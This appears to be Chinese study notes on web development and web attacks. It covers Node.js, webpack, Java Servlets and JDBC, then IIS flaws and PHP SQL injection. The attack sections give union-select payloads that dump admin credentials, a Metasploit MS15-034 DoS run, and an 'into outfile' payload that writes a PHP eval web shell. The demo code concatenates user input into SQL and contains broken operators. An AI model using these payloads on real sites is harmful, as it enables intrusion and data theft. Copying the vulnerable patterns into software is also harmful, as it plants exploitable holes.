world\n\n\n\n123npm config set registry [https://registry.npmmirror.com](https://link.zhihu.com/?target=https%3A//registry.npmmirror.com)查看是否更换npm config get registry\n\n123456789101112131415161718192021// express_demo.js 文件// 引入 Express 框架var express = require(&#x27;express&#x27;);// 创建 Express 应用程序实例var app = express();// 处理根路径的 GET 请求，返回 &#x27;Hello World&#x27;app.get(&#x27;/&#x27;, function (req, res) &#123;   res.send(&#x27;Hello World&#x27;);&#125;);// 启动服务器，监听端口 3000var server = app.listen(3000, function () &#123;  // 获取服务器地址和端口  var host = server.address().address;  var port = server.address().port;  // 输出服务器访问地址信息到控制台  console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port);&#125;);\n\n\n设置不同的页面渲染\n\n1234567891011121314151617181920// 引入 Express 框架const express = require(&#x27;express&#x27;);// 创建 Express 应用程序实例const app = express();// 处理 &#x27;/login&#x27; 路径的 GET 请求，返回简单的登录页面app.get(&#x27;/login&#x27;, function(req, res) &#123;  res.send(&#x27;&lt;hr&gt;登录页面&lt;/hr&gt;&#x27;);&#125;);// 处理根路径的 GET 请求，发送名为 &#x27;sql.html&#x27; 的文件app.get(&#x27;/&#x27;, function(req, res) &#123;  res.sendFile(__dirname + &#x27;/&#x27; + &#x27;sql.html&#x27;);&#125;);// 启动服务器，监听端口 3001const server = app.listen(3001, function() &#123;  console.log(&#x27;Web 服务器已经启动，监听端口 3001！&#x27;);&#125;);\n\n3.功能实现-nodejs-数据库&amp;文件&amp;执行\n实现用户登录\n\n\nreq.query用于处理URL查询字符串参数GET请求，而req.body用于处理POST请求中的表单数据\n\n还需要下载const bodtParser = require('body-parser');相关库 num i body-parser\n并且post请求还需要创建一个解析URL编码的bodyParser 中间件实例\n\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 引入 Express 框架const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);// 创建 Express 应用程序实例const app = express();//// 创建一个用于解析 URL 编码的 bodyParser 中间件实例const urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);**// 处理 &#x27;/login&#x27; 路径的 GET 请求，返回简单的登录页面app.get(&#x27;/login&#x27;, function(req, res) &#123;**  // 从请求中获取用户名和密码  const u = req.query.username;  const p = req.query.password;**  console.log(u);  console.log(p);  // 检查用户名和密码是否为 admin 和 123456if (u **= &#x27;admin&#x27; &amp;&amp; p **= &#x27;123456&#x27;) &#123;    res.send(&#x27;欢迎进入后台管理页面&#x27;);  &#125; else &#123;    res.send(&#x27;登录用户或密码错误&#x27;);  &#125;&#125;);// 处理 &#x27;/login&#x27; 路径的 POST 请求，使用 bodyParser 解析表单数据app.post(&#x27;/login&#x27;, urlencodedParser, function(req, res) &#123;  // 从请求中获取表单提交的用户名和密码  const u = req.body.username;  const p = req.body.password;**  console.log(u);  console.log(p);  // 检查用户名和密码是否为 admin 和 123456if (u **= &#x27;admin&#x27; &amp;&amp; p **= &#x27;123456&#x27;) &#123;    res.send(&#x27;欢迎进入后台管理页面&#x27;);  &#125; else &#123;    res.send(&#x27;登录用户或密码错误&#x27;);  &#125;&#125;);// 处理根路径的 GET 请求，发送名为 &#x27;sql.html&#x27; 的文件app.get(&#x27;/&#x27;, function(req, res) &#123;  res.sendFile(__dirname + &#x27;/&#x27; + &#x27;sql.html&#x27;);&#125;);// 启动服务器，监听端口 3001const server = app.listen(3001, function() &#123;  console.log(&#x27;Web 服务器已经启动，监听端口 3001！&#x27;);&#125;);\n\n\n\n\n\n2.加入数据库操作\n\n\n导入mysql，npm i mysql 下载相关依赖\n1const mysql = require(&#x27;mysql&#x27;);\n\n\n导入 mysql 模块\n123456var connection = mysql.createConnection(&#123;host     : &#x27;localhost&#x27;,user     : &#x27;root&#x27;,password : &#x27;root&#x27;,database : &#x27;dome01&#x27;&#125;);\n\n\n建立与 mysql 数据库的链接并执行查询语句，查询数据库中的内容\n\n\n\n1234567891011121314151617181920212223// 建立与 MySQL 数据库的连接connection.connect();// 定义从 &#x27;admin&#x27; 表中选择所有列的 SQL 查询const sql =&#x27;select * from admin&#x27;;// 执行 SQL 查询connection.query(sql, function(error, data)&#123;  // 检查查询执行中是否存在错误  if(error)&#123;    console.log(&#x27;数据库连接失败！&#x27;);  &#125;  // 记录从查询中检索到的全部数据  console.log(data);  // 记录结果集中第一行的用户名  console.log(data[0][&#x27;username&#x27;]);  // 记录结果集中第一行的密码  console.log(data[0][&#x27;password&#x27;]);&#125;);\n\n\n将 mysql 的内容添加至登录验证中\n123456789101112131415161718192021222324252627282930313233343536373839404142434445// 处理 &#x27;/login&#x27; 路径的 POST 请求，使用 bodyParser 解析表单数据app.post(&#x27;/login&#x27;, urlencodedParser, function(req, res) &#123;  // 从请求中获取表单提交的用户名和密码  const u = req.body.username;  const p = req.body.password;  // 输出获取到的用户名和密码，用于调试  console.log(u);  console.log(p);  // 创建与 MySQL 数据库的连接  var connection = mysql.createConnection(&#123;    host     : &#x27;localhost&#x27;,    user     : &#x27;root&#x27;,    password : &#x27;root&#x27;,    database : &#x27;dome01&#x27;  &#125;);  **// 建立数据库连接  connection.connect();  // 构建 SQL 查询，检查数据库中是否存在匹配的用户名和密码  const sql = &#x27;select * from admin where username=&quot;&#x27;+u+&#x27;&quot; and password=&quot;&#x27;+p+&#x27;&quot;&#x27;;  console.log(sql);  // 执行 SQL 查询  connection.query(sql, function(error, data)&#123;    // 检查查询执行中是否存在错误    if(error)&#123;        console.log(&#x27;数据库连接失败！&#x27;);    &#125;    try &#123;        // 检查用户名和密码是否匹配数据库中的数据        if(u ** data[0][&#x27;username&#x27;] &amp;&amp; p ** data[0][&#x27;password&#x27;])&#123;            // 如果匹配，发送欢迎消息到前端            res.send(&#x27;欢迎进入后台管理页面&#x27;);        &#125;    &#125; catch &#123;        // 捕获异常，如果没有匹配的数据或其他错误，发送错误消息到前端        res.send(&#x27;错误&#x27;);    &#125;;**  &#125;);&#125;)\n\n\n3.文件操作\n\n\n导入fs，npm i fs 下载相关依赖npm i fs\n1const fs = require(&#x27;fs&#x27;);\n\n\n调用文件管理函数，传递目录参数\n\nhttp://127.0.0.1:3000/file?dir=./\nhttp://127.0.0.1:3000/file?dir=…/\n\n1234567891011121314151617181920212223242526272829// 引入文件系统和 Express 框架const fs = require(&#x27;fs&#x27;);const express = require(&#x27;express&#x27;);const app = express();// 处理 &#x27;/file&#x27; 路径的 GET 请求app.get(&#x27;/file&#x27;, function (req, res) &#123;    // 从请求中获取目录参数    const dir = req.query.dir;    console.log(dir);    // 调用文件管理函数，传递目录参数    filemanage(dir);&#125;);// 启动 Express 应用监听在3000端口var server = app.listen(3000, function () &#123;    console.log(&#x27;Web应用已启动在3000端口！&#x27;);&#125;);// 文件管理函数，接收一个目录参数function filemanage(dir) &#123;    **// 使用 fs.readdir 读取目录下的文件    fs.readdir(dir, function (error, files) &#123;        // 打印目录中的文件列表        console.log(files);**    &#125;);&#125;\n\n\n\n4.命令执行（RCE）\n\n\n导入 child_process，npm i child_process下载相关依赖\n1const rce=require(&#x27;child_process&#x27;);\n\n\nexec &amp; spawnSync调用系统命令\n\n\neval调用代码命令执行，将字符串当做代码解析\n123456789101112// 引入child_process模块const rce = require(&#x27;child_process&#x27;);// 使用exec方法调用系统命令&#x27;notepad&#x27;，打开记事本rce.exec(&#x27;notepad&#x27;);// 使用spawnSync方法调用系统命令&#x27;calc&#x27;，打开计算器rce.spawnSync(&#x27;calc&#x27;);// 使用eval调用代码命令执行，将字符串当做代码解析// 请注意：避免在生产环境中使用eval，可能存在安全风险eval(&#x27;require(&quot;child_process&quot;).exec(&quot;calc&quot;);&#x27;);\n\n\n\n4.安全问题-node.js-注入&amp;RCE&amp;原型链\nSQL注入&amp;文件操作\n\n\nRCE执行&amp;原型链污染\n\n很少遇到\n\nnode.js 黑盒无代码分析\n案例分析-node.js-ctf题目&amp;源码审计\nweb334\n\n四、JS 应用&amp;webpack打包器&amp;第三方库JQuery&amp;安装使用&amp;安全检测\n为什么使用-webpack\n\n模块化支持：\n\nWebpack 支持将应用程序拆分为模块，使开发人员能够使用模块化的方式组织和管理代码。模块化能够提高代码的可维护性、重用性和可测试性。\n\n\n资源打包：\n\nWebpack 可以将项目中的各种资源（例如 JavaScript、CSS、图像等）视为模块，并将它们打包成一个或多个最终的静态资源文件。这样可以减少网络请求的次数，提高应用程序的加载性能。\n\n\n代码分割：\n\nWebpack 支持将应用程序的代码分割成多个块（chunks），并在需要时按需加载。这种代码分割的技术可以提高应用程序的初始加载速度，并减小用户需要下载的初始文件大小。\n\n\n资源优化：\n\nWebpack 提供了丰富的插件和工具生态系统，可以进行各种资源优化和转换，例如压缩代码、处理样式预处理器、优化图像等。这些优化可以减小资源文件的大小，提高应用程序的性能。\n\n\n开发环境支持：\n\nWebpack 提供了强大的开发环境支持，包括开发服务器、热模块替换（Hot Module Replacement）、源代码映射等功能。这些功能可以提升开发效率，加快开发周期。\n\n\n\n打包器-webpack-使用&amp;安全\n\n\n参考：https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA\n\n\nwebpack是一个模块打包器。在webpack中会将前端的所有资源文件都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源\n\n\n五个核心概念：\n123456789【入口(entry)】：指示webpack应该使用哪个模块，来作为构建内部依赖图开始。【输出(output)】：在哪里输出文件，以及如何命名这些文件。【Loader】：处理那些非JavaScript文件（webpack 自身只能解析 JavaScript和json）。webpack 本身只能处理JS、JSON模块，如果要加载其他类型的文件(模块)，就需要使用对应的loader。【插件(plugins)】：执行范围更广的任务，从打包到优化都可以实现。【模式(mode)】：有生产模式production和开发模式development。\n\n\nwebpack使用\n创建需打包文件\n\n\n创建webpack，并创建目录src在目录下创建js目录在js目录下创建sum.js count.js\n\n\n\nsum.js\n123export default function sum(x,y)&#123;    return x+y;&#125;\n\n\ncount.js\n123export default function count(x,y)&#123;    return x-y;&#125;\n\n\n在src目录下创建与js同级main.js\n12345import count from &quot;./js/count&quot;;import sum from &quot;./js/sum&quot;;console.log(sum(1,2));console.log(count(1,2));\n\n\n在创建src同级文件index.html\n12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\n\n报错Cannot use import statement outside a module，尝试在不支持模块的环境中使用 ES6 的 import 打包语句造成无法执行；\n\n\n\n\n\n安装webpack库\n1npm i webpack wepack-cli -g\n\n\n\n创建webpack配置文件，src同级文件webpack.config.js不能该名称\n123456789101112131415161718192021222324// 引入path模块，用于处理文件路径const path = require(&#x27;path&#x27;);// Webpack配置对象module.exports = &#123;    **// 指定入口文件，即Webpack从这个文件开始构建依赖图    entry: &#x27;./src/main.js&#x27;,**    // 指定输出配置    output: &#123;        // 输出的文件路径，使用path.resolve确保路径的正确性        path: path.resolve(__dirname, &#x27;dist&#x27;),        // 输出的文件名        filename: &#x27;bundle.js&#x27;,        // 在每次构建前清理输出目录        clean: true,    &#125;,    // 指定打包模式，可以是 &#x27;development&#x27; 或 &#x27;production&#x27;    mode: &quot;development&quot;, // 或者 &quot;production&quot;    //mode:&quot;production&quot;,&#125;;\n12345entry:    指定入口文件，即Webpack从哪个文件开始构建依赖关系图。output:   指定输出的目录和文件名，以及是否在每次构建前清理输出目录。mode:    指定打包的模式，可以是 ‘development’ 或 ‘production’。development： 模式下会启用一些开发工具，容易造成源码泄露production： 模式下会进行代码优化，代码极简化\n\n\n运行webpack打包命令\n1npx webpack\n\n\n\n打包成功后，在index.html中将引用的代码切换为打包好的./dist/bundle.\n123&lt;body&gt;    &lt;script src=&quot;./dist/bundle.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;\n\n\n运行成功，并回显定义的两个函数计算结果\n\n\n\nwebpack源码泄露-模式选择\n\n\ndevelopment 模式下会启用一些开发工具，容易造成源码泄露\n\n\nproduction 模式下会进行代码优化，代码极简化。\n\n\n\n\n模糊提取安全检查-PacketFuzzer\n\n项目地址：https://github.com/rtcatc/Packer-Fuzzer\n这类打包器会将整站的API和API参数打包在一起供Web集中调用，这也便于我们快速发现网站的功能和API清单，但往往这些打包器所生成的JS文件数量异常之多并且总JS代码量异常庞大（多达上万行），这给我们的手工测试带来了极大的不便，Packer Fuzzer软件应运而生。\n本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。\n\n第三方库-JQuery-使用&amp;安全\n\njQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。设计目的是为了写更少的代码，做更多的事情。它封装JavaScript常用功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。\n\nJAVA 开发\n一、JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期\n\n\n打叉的已经落后了\n\n1.HTTP-Servlet&amp;路由&amp;周期\n\n\n参考文章：https://blog.csdn.net/qq_52173163/article/details/121110753\n\n\nServlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。\n\n\n接下来演示的版本是javaee servlet 4.0、JDK8、Tomcat9\n\n\n2.创建和使用Servlet\n\n创建一个类继承HttpServlet\n\n123456789public class IndexServlet extends HelloServlet&#123;    //处理GET请求的方法    @Override    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;        //从请求中获得参数name        String name = request.getParameter(&quot;name&quot;);        //设置响应的内容类型        response.setContentType(&quot;text/html; charset = GBK&quot;);\n\nweb.xml配置Servlet路由\n\n123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;    **&lt;!-- 定义Servlet --&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;index&lt;/servlet-name&gt;        &lt;!-- 指定Servlet类的完整路径 --&gt;        &lt;servlet-class&gt;com.example.demo1.IndexServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;!-- 配置Servlet映射 --&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;index&lt;/servlet-name&gt;        &lt;!-- 指定Servlet的URL映射 --&gt;        &lt;url-pattern&gt;/index&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;**&lt;/web-app&gt;\n\nwebServlet配置Servlet路由\n\n123456//使用@WebServlet注解将Servlet映射到特定的URL@WebServlet(&quot;/a&quot;)public class IndexServlet extends HelloServlet&#123;    //处理GET请求的方法    @Override\n\n写入内置方法(init service destroy doget dopost)\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788package com.example.demo1;import java.io.IOException;import java.io.PrintWriter;import javax.servlet.ServletException;import javax.servlet.ServletConfig;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;// 使用@WebServlet注解将Servlet映射到特定的URL@WebServlet(&quot;/a&quot;)public class IndexServlet extends HttpServlet &#123;    // 处理GET请求的方法    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        System.out.println(&quot;--------------doGet&quot;);        // 从请求中获取参数&quot;id&quot;        String id = req.getParameter(&quot;id&quot;);        // 设置响应的内容类型        resp.setContentType(&quot;text/html; charset=GBK&quot;);        // 获取PrintWriter以将HTML响应发送给客户端        PrintWriter out = resp.getWriter();        // 输出从GET请求中收到的数据        out.println(&quot;这是GET请求的数据:&quot;);        out.println(&quot;id：&quot; + id + &quot;&lt;br&gt;&quot;);        out.flush();        out.close();    &#125;    // 处理POST请求的方法    @Override    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        // 从请求中获取参数&quot;name&quot;        String name = req.getParameter(&quot;name&quot;);        // 设置响应的内容类型        resp.setContentType(&quot;text/html; charset=GBK&quot;);        // 获取PrintWriter以将HTML响应发送给客户端        PrintWriter out = resp.getWriter();        // 输出从POST请求中收到的数据        out.println(&quot;这是post提交的数据&quot;);        out.println(name);        out.flush();        out.close();        System.out.println(&quot;--------------doPost&quot;);    &#125;    // 当Servlet首次创建时调用的初始化方法    @Override    public void init(ServletConfig config) throws ServletException &#123;        System.out.println(&quot;--------------init&quot;);        // 可以在这里添加任何初始化任务的代码    &#125;    // 当Servlet被销毁时调用的方法    @Override    public void destroy() &#123;        System.out.println(&quot;--------------destroy&quot;);        super.destroy();    &#125;    // 处理GET和POST请求的服务方法    @Override    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        System.out.println(&quot;--------------http service&quot;);        super.service(req, resp);    &#125;    // 覆盖的用于ServletRequest和ServletResponse的服务方法    @Override    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;        System.out.println(&quot;--------------Servlet service&quot;);        super.service(req, res);    &#125;&#125;\n\ndopost\n\n1234567891011121314151617181920212223242526272829303132@Overrideprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;    // 从请求参数中获取名字数据    String name = req.getParameter(&quot;name&quot;);        // 设置请求编码为UTF-8，以确保正确解析中文字符    req.setCharacterEncoding(&quot;UTF-8&quot;);        // 设置响应内容类型为text/html    resp.setContentType(&quot;text/html&quot;);        // 获取PrintWriter对象，用于向客户端发送响应数据    PrintWriter out = resp.getWriter();        // 向客户端发送提示信息，表示这是通过POST提交的数据    out.println(&quot;这是post提交的数据&quot;);        // 向客户端发送从请求参数中获取的名字数据    out.println(name);        // 在服务器端打印名字数据到控制台    System.out.println(name);        // 刷新输出缓冲区，确保数据被及时发送到客户端    out.flush();        // 关闭PrintWriter，释放资源    out.close();        // 在服务器端打印信息，表示doPost方法执行完成    System.out.println(&quot;--------------doPost&quot;);&#125;\n\n\nServlet生命周期\n\n\n\n\n\n处理接受和回显\nHttp ServletRequest（HTTP请求的信息）\n\n12345ServletRequest的子接口：HttpServletRequest是ServletRequest接口的子接口，提供了用于处理HTTP请求的额外功能。    getParameter(name)：通过参数名获取请求中的值。返回一个String，表示与给定参数名相对应的单个值。    getParameterValues(name)：通过参数名获取请求中的多个值。返回一个String[]，表示与给定参数名相对应的多个值\n\nHttp ServletResponse（HTTP响应的信息）\n\n123456789ServletResponse的子接口：HttpServletResponse是ServletResponse接口的子接口，提供了用于处理HTTP响应的额外功能。    setCharacterEncoding()：设置响应的字符编码格式。通常用于确保正确的文本输出。    setContentType()：设置响应内容的类型和编码。常用于指定输出的数据类型，如HTML、JSON等。    getWriter()：获取一个PrintWriter字符输出流，用于向客户端发送文本数据。    PrintWriter：PrintWriter是用于向客户端输出字符数据的类，可以接受各种数据类型，然后将其转换为文本并发送到客户端。\n3.JDBC&amp;Mybatis&amp;库\n\n原生态数据库开发：JDBC\n参考文章：https://www.jianshu.com/p/ed1a59750127\nJDBC（java Database connectivity)：由java提供，用于访问数据库的统一API接口规范，数据库驱动：由各个数据库厂商提供，用于访问数据库的jar包（JDBC的具体实现），遵循JDBC接口，以便java程序员使用\n\n注册数据库驱动\n\n“com.mysql.jdbc.Driver”： 这是 MySQL JDBC 驱动程序的类名。JDBC（Java Database Connectivity）是 Java 用于与数据库交互的 API，而不同的数据库供应商提供了各自的 JDBC 驱动程序。在这里，“com.mysql.jdbc.Driver” 是 MySQL JDBC 驱动程序的类名。\n加载和初始化： 当调用 Class.forName(&quot;com.mysql.jdbc.Driver&quot;); 时，它会尝试查找、加载并初始化指定的类。在这个过程中，MySQL JDBC 驱动程序的静态代码块（static &#123;...&#125;）会被执行，这通常用于注册驱动程序。\n\n在旧版本的MySQL驱动中，com.mysql.jdbc.Driver是驱动类的完整路径\n在新版本中，com.mysql.cj.jdbc.Driver是mysql Connector/J 的驱动类\n\n\n\n1Class.forName(&quot;com.mysql.jdbc.Driver&quot;);\n建立数据库里连接\n12345678// 定义数据库连接的URL，格式为：jdbc:mysql://host:port/database            String url = &quot;jdbc:mysql://localhost:3306/dome01&quot;;            // 使用DriverManager获取数据库连接            Connection connection = DriverManager.getConnection(url, &quot;root&quot;, &quot;root&quot;);            // 打印数据库连接信息            System.out.println(connection);\nWEB 攻防\nASP 安全\n默认安装-MDB 数据库泄露下载\n\n由于大部分 ASP 程序与 ACCESS 数据库搭建，但 ACCESS 无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击\n\nHTTP.sys 远程执行代码漏洞\nHTTP.SYS（CVE-2015-1635）\nhttps://blog.csdn.net/qq_41210745/article/details/103437683\n\n\n漏洞描述：\n\n远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。\n\n\n\n影响版本：\n\nWindows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2\n\n\n\n漏洞利用条件：\n\n安装了 IIS6.0 以上的 Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2 版本\n\n\n\n漏洞复现：\n123456789msfconsoleuse auxiliary/dos/http/ms15_034_ulonglongaddset rhosts xx.xx.xx.xxset rport xxrun\n\n\nIIS 短文件\n\n介绍：\n\n此漏洞实际是由 HTTP 请求中旧 DOS 8.3 名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在 Web 根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件, 并获取有关应用程序基础结构的信息\n\n\n漏洞成因：\n\n为了兼容 16 位 MS-DOS 程序, Windows 为文件名较长的文件(和文件夹)生成了对应的 windows 8.3 短文件名。在 Windows 下查看对应的短文件名, 可以使用命令 dir /x\n\n\n应用场景：\n\n后台路径获取，数据库文件获取，其他敏感文件获取等\n\n\n利用工具：\n\nhttps://github.com/irsdl/IIS-ShortName-Scanner\nhttps://github.com/lijiejie/IIS_shortname_Scanner\n\n\n\nIIS 文件解析（IIS 6 无补丁）\n\n该版本默认会将 ***.asp;.jpg ** 此种格式的文件名，当成 asp 解析\n该版本默认会将 ***.asp/目录下 ** 的所有文件当成 asp 解析\n\nPHP-SQL 注入\n一、相关基础\n1.MYSQL-Web 组成架构\n\n服务器安装 MYSQL 数据库，搭建多个站点，数据库集中存储 MYSQL 数据库中管理，可以都使用 root 用户管理也可以创建多个用户进行每个网站对应的数据库管理\n\n（1）统一交给root用户管理\n\nwww.zblog.com  = zblog  = root =&gt; MYSQL\nwww.demo01.com = demo01 = root =&gt; MYSQL\n\n（2）一对一用户管理（推荐）\n\nwww.zblog.com  = zblog  = zblog =&gt; MYSQL\nwww.demo01.com = demo01 = demo01 =&gt; MYSQL\n\n2.常规查询\n\n\n获取相关数据：\n\n\n1、数据库版本-看是否符合 information_schema 查询-version() --SELECT VERSION();\n\n\n2、数据库用户-看是否符合 ROOT 型注入攻击-user() --SELECT USER();\n\n\n3、当前操作系统-看是否支持大小写(Linux 区分大小写)或文件路径选择-@@version_compile_os\n\n\n4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()\n\n\nMYSQL 5.0 以上版本：自带的数据库名为 information_schema\n123information_schema  #存储数据库下的数据库名及表名，列名信息的表&quot;.&quot;代表下一级 select *from security.usersinfomation_schema.schemata #记录数据库的表\n\n1information_schema.tables   #记录表名信息的表\n![](…/images/网安知识点/image (1).png)\n1information_schema.columns   #记录列名信息表\n![](…/images/网安知识点/image (2).png)\n1234567schema_name：information_schema.schemata  #记录数据库名信息的列名值（数据库名字）table_schema：information_schema.tables   #记录数据库名的列名值table_name：information_schema.tables     #记录表名的列名值column_name：information_schema.columns   #记录列名的列名值\n![](…/images/网安知识点/image (3).png)\n\n\n\n\n\n简单注入流程：\n1234567891011order by 6   #确认有几列，报错与不报错，取不报错那列union select 1,2,3,4,5,6   #找能看见回显的union select 1,2,3,database(),user(),6    #联合查询数据库名和数据库连接的用户union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema = &#x27;demo1&#x27;   #查demo1数据库中的表名，group_concat是查全部的表名 union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema = &#x27;demo1&#x27;  and table_name = &#x27;admin&#x27;    #查admin表中的列名union select 1,2,3,4，group_concat(id,usename,password),6 from admin\n\n\n3.跨库查询\n\n\n影响条件：当前数据库 root 用户权限\n\n\n测试不同数据库用户：root demo\n\n\nhttp://127.0.0.1/sql/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from infoemation_schema.schemata --+\n![](…/images/网安知识点/image (4).png)\n\n\nhttp://127.0.0.1/sql/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema.tables where table_schema = 'test' --+\n![](…/images/网安知识点/image (5).png)\n\n\nunion select 1,2,3,4,group_concat(coulmn_name),6 from information_schema.columns where table_name = 'zbp_member' and table_schema = 'zblog'\n![](…/images/网安知识点/image (6).png)\n\n\nunion select 1,group_concat(id,uname,pword),3 from test.admin --+\n![](…/images/网安知识点/image (7).png)\n\n\n4.文件续写\n\n\n影响条件：\n\n1、当前数据库用户权限（root 权限才可以续写）\n2、secure-file-priv 设置（目录限制）（my.ini --secure_file_priv =“”）\n\n\n\n操作步骤：\n\n\nunion select 2,load_file('d:\\\\1.txt'),3\n![](…/images/网安知识点/image (8).png)\n\n\nunion select 1,'&lt;?php eval(@$_POST[1]); ?&gt;',3 into outfile 'D:/phpstudy_pro/www/sql/shell.php'\n![](…/images/网安知识点/image (9).png)\n\n\n\n\n写入存在的一些问题：\n\n1、写入的内容其中 “ ” 单引号会引起报错（可能是没有闭合）\n2、目录\\和/，win 用/比较好\n\n\n\n解决：单引号过滤绕过方式\n\nSQL 注入语句中用单引号就不要用编码（0x 十六进制），编码就不用单引号（路径，表名，数据库名等）\n\n\n\n读写的路径的问题：\n\n1.报错显示获取路径\n2.phpinfo 页面泄露\n\n\n\n如果不知道路径思路：\n\n利用常见的默认的中间件，数据库等安装路径读取有价值的信息\n\n\n\n5.网上相关资料\n\n五大主流数据库比较：https://blog.csdn.net/amork/article/details/6830353\nMYSQL 中 concat()、concat_ws()、group_concat 函数使用技巧心得：https://zhuanlan.zhihu.com/p/257399676\nSQL 注入中无法利用 information_scema 的情况：https://blog.csdn.net/qq_43936524/article/details/116796087\n查询数据库的数据库名和表名（mysql、mssql、oracle）\n\n二、基础绕过方法\n1.数据请求类型\n\nSQL 语句由于在黑盒中是无法预知写法的，SQL 注入能发成功是需要拼接原 SQL 语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原 SQL 语句的未知性导致的拼接失败！\n由于开发者对于数据类型和 SQL 语句写法（框架写法）导致 SQL 注入拼接失败\n\n12345678910111213141516171. 数字型（无符号干扰）select * from news where id = $id;2. 字符型（有符号干扰）select * from news where id = &#x27;$id&#x27;;select * from news where id = &quot;$id&quot;;3. 搜索型（有多个符号干扰）select * from news where id like &#x27;%$id%&#x27;;select * from news where id like &quot;%$id%&quot;;select * from news where id like &#x27;_$id_&#x27;;select * from news where id like &quot;_$id_&quot;;4. 框架型（有各种符号干扰）select * from news where id = (&#x27;$id&#x27;);select * from news where id = ((&quot;$id&quot;));select * from news where (id = &#x27;$id&#x27;);\n2.数据请求方法\n\n\n全局变量方法：\n\n$_GET[]：GET 方法获取参数\n$_POST[]：POST 方法获取参数\n$_SERVER[]：获取服务器/客户端的信息，比如 UA 头、XFF 头、Rerferer 头等\n$_FILE[]：获取文件信息\n$_COOKIE[]：获取 Cookie 信息\n\n\n\nUser-Agent:\n\n使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中\n\n\n\nCookie:\n\n网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据 X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP 的请求端真实的 IP,（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库 or 某文件 [通过修改 XXF 头可以实现伪造 IP]）.\n\n\n\nRerfere:\n\n浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.\n\n\n\nHost：\n\n客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号\n\n\n\n墨者 X-Forwarded-For 注入漏洞实战：https://blog.csdn.net/qq_49780354/article/details/123402925\n\n\n如功能点：\n\n1.用户登录时\n2.登录判断 ip 时，是 PHP 特性中的 $_SERVER['HTTP_X_FORWARDED_FOR']; 